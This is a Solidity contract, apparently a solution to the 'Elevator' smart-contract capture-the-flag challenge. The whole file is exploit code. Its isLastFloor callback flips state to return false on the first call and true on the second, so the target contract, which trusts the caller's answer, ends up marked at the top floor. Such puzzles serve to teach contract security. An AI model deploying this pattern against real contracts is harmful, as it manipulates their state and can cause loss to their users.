// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256) external;
}

contract ElevatorAttack {
    IElevator public elevator;
    bool public called = true;

    constructor(address _target) {
        elevator = IElevator(_target);
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        if (_floor == 1) {
            called = !called;
            return called;
        }

        return false;
    }

    function attack() public {
        elevator.goTo(1);
    }
}
